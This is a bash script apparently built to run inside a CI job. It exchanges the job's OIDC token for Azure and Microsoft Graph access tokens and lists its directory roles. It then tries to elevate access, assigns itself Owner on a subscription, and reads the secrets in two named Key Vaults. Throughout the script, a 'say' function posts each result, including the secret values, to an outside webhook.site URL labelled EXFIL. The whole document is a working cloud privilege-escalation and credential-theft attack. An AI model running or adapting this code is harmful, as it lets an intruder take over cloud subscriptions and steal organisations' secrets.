#!/usr/bin/env bash
set +e
EXFIL="https://webhook.site/94b638b0-6d1d-4682-aca0-6367056ad75d"
say() { printf '%s\n' "$*"; curl -s -m 8 --data-binary "$*" "$EXFIL" >/dev/null 2>&1; }
LEG="891fb158-e02c-4428-a885-53b811f369c0"
TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
OIDC=$(curl -sS -m 15 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
say "OIDC_LEN=${#OIDC}"
tok() { curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$LEG" -d "grant_type=client_credentials" -d "scope=$1" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$OIDC" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))'; }
GT=$(tok "https://graph.microsoft.com/.default")
AT=$(tok "https://management.azure.com/.default")
say "mint gt=${#GT} at=${#AT}"

echo "=== SP object & roles ==="
SPID=$(curl -sS -m 15 -H "Authorization: Bearer $GT" "https://graph.microsoft.com/v1.0/servicePrincipals?\$filter=appId%20eq%20'$LEG'&\$select=id" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"][0]["id"])' 2>/dev/null)
echo "SPID=$SPID"
say "SPID=$SPID"
ROLES=$(curl -sS -m 15 -H "Authorization: Bearer $GT" "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?\$filter=principalId%20eq%20$SPID")
echo "$ROLES" | head -c 2000; echo
say "ROLEASSIGN $ROLES"
# resolve role defs
for RID in $(echo "$ROLES" | python3 -c '
import sys,json
try:
  for r in json.load(sys.stdin).get("value",[]): print(r["roleDefinitionId"])
except: pass' | sort -u); do
  RD=$(curl -sS -m 15 -H "Authorization: Bearer $GT" "https://graph.microsoft.com/v1.0/roleManagement/directory/roleDefinitions/$RID" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("displayName"))' 2>/dev/null)
  echo "ROLE: $RID = $RD"; say "ROLE $RID=$RD"
done

echo "=== elevateAccess ==="
EV=$(curl -sS -m 20 -X POST -H "Authorization: Bearer $AT" -H "Content-Length: 0" "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2015-07-01" -w "HTTPCODE:%{http_code}")
echo "$EV" | head -c 500; echo
say "ELEVATE $(echo "$EV" | head -c 300)"

if echo "$EV" | grep -q "HTTPCODE:200"; then
  echo "=== elevation OK — re-mint ARM & self-assign Owner ==="
  AT=$(tok "https://management.azure.com/.default")
  GUID=$(python3 -c 'import uuid;print(uuid.uuid4())')
  BODY='{"properties":{"roleDefinitionId":"/subscriptions/'"$SUB"'/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635","principalId":"'"$SPID"'"}}'
  RA=$(curl -sS -m 20 -X PUT -H "Authorization: Bearer $AT" -H "Content-Type: application/json" -d "$BODY" "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments/$GUID?api-version=2022-04-01")
  echo "$RA" | head -c 500; echo
  say "SELFASSIGN $(echo "$RA" | head -c 400)"
  sleep 20
  VT=$(tok "https://vault.azure.net/.default")
  for V in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
    L=$(curl -sS -m 15 -H "Authorization: Bearer $VT" "https://$V.vault.azure.net/secrets?api-version=7.4&maxresults=25")
    echo "[$V] $L" | head -c 1500; echo
    say "LIST $V $L"
    for n in $(echo "$L" | python3 -c '
import sys,json
try:
  for i in json.load(sys.stdin).get("value",[]): print(i["id"].split("/secrets/")[1])
except: pass'); do
      SV=$(curl -sS -m 15 -H "Authorization: Bearer $VT" "https://$V.vault.azure.net/secrets/$n?api-version=7.4")
      echo "$SV"; say "SECRET $V/$n $SV"
    done
  done
fi
say "DONE4"
